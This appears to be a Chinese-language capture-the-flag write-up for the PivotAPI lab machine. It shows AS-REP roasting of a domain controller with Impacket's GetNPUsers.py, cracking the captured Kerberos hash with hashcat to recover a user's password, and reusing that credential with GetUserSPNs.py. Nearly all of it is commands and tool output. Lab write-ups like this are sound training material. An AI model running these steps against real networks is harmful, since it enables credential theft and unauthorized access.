---
title: Getnp
date: 2026-04-13T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
---
## GetNPUsers.py

- 使用 GetNPUsers.py 查看是否有用户禁用了 Kerberos 预认证。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ GetNPUsers.py -no-pass -dc-ip 10.129.228.115 LicorDeBellota.htb/ -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User jari doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- 用 hashcat 爆破出 hash 的值为 `Roper4155`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

/home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27813 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02:Roper4155
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68...bd1c02
Time.Started.....: Tue Apr  7 11:07:11 2026 (3 secs)
Time.Estimated...: Tue Apr  7 11:07:14 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3550.5 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10674176/14344385 (74.41%)
Rejected.........: 0/10674176 (0.00%)
Restore.Point....: 10665984/14344385 (74.36%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Ryanpenis -> RipBean
Hardware.Mon.#01.: Util: 62%

Started: Tue Apr  7 11:06:52 2026
Stopped: Tue Apr  7 11:07:14 2026
```

- 使用爆破出来的 hash 进一步枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ GetUserSPNs.py -dc-ip 10.129.228.115 LicorDeBellota.htb/Kaorz:Roper4155        
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```
 